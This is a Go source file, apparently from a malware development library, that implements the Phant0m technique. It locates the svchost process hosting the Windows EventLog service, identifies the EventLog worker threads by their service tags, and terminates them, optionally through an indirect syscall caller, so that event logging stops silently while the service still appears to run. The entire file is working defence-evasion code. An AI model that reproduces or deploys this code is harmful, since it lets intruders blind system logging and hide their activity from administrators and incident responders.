//go:build windows

package phant0m

import (
	"fmt"
	"strings"
	"unsafe"

	"golang.org/x/sys/windows"

	"github.com/oioio-space/maldev/win/api"
	wsyscall "github.com/oioio-space/maldev/win/syscall"
)

// threadEntry32 matches THREADENTRY32 for CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD).
// x/sys/windows does not expose ThreadEntry32, so we define it locally.
type threadEntry32 struct {
	Size           uint32
	Usage          uint32
	ThreadID       uint32
	OwnerProcessID uint32
	BasePri        int32
	DeltaPri       int32
	Flags          uint32
}

// scServiceTagQuery is the input/output structure for I_QueryTagInformation.
// Type 1 (ServiceNameFromTagInformation) maps a (PID, tag) pair to a service name.
type scServiceTagQuery struct {
	ProcessID  uint32
	ServiceTag uint32
	_          uint32 // reserved/type — must be 1 for ServiceNameFromTagInformation
	Buffer     unsafe.Pointer
}

// threadSubProcessTag is the TEB SubProcessTag offset value returned by
// NtQueryInformationThread with ThreadQuerySetWin32StartAddress class (class 26).
// On x64, the SubProcessTag is a ULONG stored in the TEB.
const threadQuerySetWin32StartAddress = 9

var (
	procThread32First = api.Kernel32.NewProc("Thread32First")
	procThread32Next  = api.Kernel32.NewProc("Thread32Next")
)

// tagQueryAvailable reports whether I_QueryTagInformation can be called.
// Cached on first invocation.
var tagQueryAvailable *bool

func canQueryTags() bool {
	if tagQueryAvailable != nil {
		return *tagQueryAvailable
	}
	err := api.ProcI_QueryTagInformation.Find()
	avail := err == nil
	tagQueryAvailable = &avail
	return avail
}

// isEventLogThread checks whether a thread (identified by its TID) in the
// given process belongs to the EventLog service by reading its service tag
// from the TEB and resolving it via I_QueryTagInformation.
//
// Returns true if the thread is confirmed to be an EventLog worker, or if
// service tag validation is unavailable (graceful fallback).
func isEventLogThread(pid, tid uint32) bool {
	if !canQueryTags() {
		// I_QueryTagInformation unavailable (older Windows) — fall back to
		// killing all threads of the PID (original behavior).
		return true
	}

	// Open the thread with QUERY_INFORMATION access to read TEB fields.
	const threadQueryInformation = 0x0040
	hThread, err := windows.OpenThread(threadQueryInformation, false, tid)
	if err != nil {
		return true // cannot verify — assume EventLog to avoid silent skip
	}
	defer windows.CloseHandle(hThread)

	// Read the SubProcessTag via NtQueryInformationThread(ThreadQuerySetWin32StartAddress).
	// Despite the misleading class name, on modern Windows this returns the
	// thread's service tag when the thread belongs to a service host process.
	var tag uintptr
	r, _, _ := api.ProcNtQueryInformationThread.Call(
		uintptr(hThread),
		threadQuerySetWin32StartAddress,
		uintptr(unsafe.Pointer(&tag)),
		unsafe.Sizeof(tag),
		0,
	)
	if r != 0 || tag == 0 {
		// No service tag — thread is not a service worker or query failed.
		return false
	}

	// Build the query struct for I_QueryTagInformation.
	// Type must be 1 (ServiceNameFromTagInformation) — embedded as the third
	// DWORD in the structure.
	type tagQuery struct {
		ProcessID  uint32
		ServiceTag uint32
		TagType    uint32
		Buffer     unsafe.Pointer
	}
	q := tagQuery{
		ProcessID:  pid,
		ServiceTag: uint32(tag),
		TagType:    1, // ServiceNameFromTagInformation
	}

	r, _, _ = api.ProcI_QueryTagInformation.Call(
		0, // reserved
		1, // ServiceNameFromTagInformation
		uintptr(unsafe.Pointer(&q)),
	)
	if r != 0 || q.Buffer == nil {
		return false
	}

	// Buffer points to a wide string with the service name.
	svcName := windows.UTF16PtrToString((*uint16)(q.Buffer))
	return strings.EqualFold(svcName, "EventLog")
}

// Kill terminates threads belonging to the Windows Event Log service.
// On modern Windows (Vista+), each thread's service tag is validated via
// I_QueryTagInformation so that only EventLog worker threads are killed,
// leaving other services in the same svchost.exe process unaffected.
// If tag validation is unavailable, all threads of the EventLog PID are killed.
//
// The service process (svchost.exe) continues running but its worker threads
// are killed, silently stopping all event log writes.
//
// Requires SeDebugPrivilege (typically available to SYSTEM or elevated admin).
func Kill(caller *wsyscall.Caller) error {
	pid, err := findEventLogPID()
	if err != nil {
		return fmt.Errorf("find EventLog PID: %w", err)
	}

	snap, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPTHREAD, 0)
	if err != nil {
		return fmt.Errorf("CreateToolhelp32Snapshot: %w", err)
	}
	defer windows.CloseHandle(snap)

	var te threadEntry32
	te.Size = uint32(unsafe.Sizeof(te))

	r, _, err := procThread32First.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
	if r == 0 {
		return fmt.Errorf("Thread32First: %w", err)
	}

	killed := 0
	for {
		if te.OwnerProcessID == pid && isEventLogThread(pid, te.ThreadID) {
			hThread, openErr := windows.OpenThread(windows.THREAD_TERMINATE, false, te.ThreadID)
			if openErr == nil {
				if caller != nil {
					ret, _ := caller.Call("NtTerminateThread", uintptr(hThread), 0)
					if ret == 0 {
						killed++
					}
				} else {
					r, _, _ = api.ProcTerminateThread.Call(uintptr(hThread), 0)
					if r != 0 {
						killed++
					}
				}
				windows.CloseHandle(hThread)
			}
		}

		te.Size = uint32(unsafe.Sizeof(te))
		r, _, _ = procThread32Next.Call(uintptr(snap), uintptr(unsafe.Pointer(&te)))
		if r == 0 {
			break
		}
	}

	if killed == 0 {
		return fmt.Errorf("no EventLog threads found for PID %d", pid)
	}
	return nil
}

// findEventLogPID finds the PID of the svchost.exe instance hosting EventLog.
func findEventLogPID() (uint32, error) {
	scm, err := windows.OpenSCManager(nil, nil, windows.SC_MANAGER_CONNECT)
	if err != nil {
		return 0, fmt.Errorf("OpenSCManager: %w", err)
	}
	defer windows.CloseServiceHandle(scm)

	svcName, _ := windows.UTF16PtrFromString("EventLog")
	svc, err := windows.OpenService(scm, svcName, windows.SERVICE_QUERY_STATUS)
	if err != nil {
		return 0, fmt.Errorf("OpenService EventLog: %w", err)
	}
	defer windows.CloseServiceHandle(svc)

	var needed uint32
	var ssp windows.SERVICE_STATUS_PROCESS
	err = windows.QueryServiceStatusEx(svc, windows.SC_STATUS_PROCESS_INFO,
		(*byte)(unsafe.Pointer(&ssp)), uint32(unsafe.Sizeof(ssp)), &needed)
	if err != nil {
		return 0, fmt.Errorf("QueryServiceStatusEx: %w", err)
	}

	if ssp.ProcessId == 0 {
		return 0, fmt.Errorf("EventLog service not running")
	}
	return ssp.ProcessId, nil
}
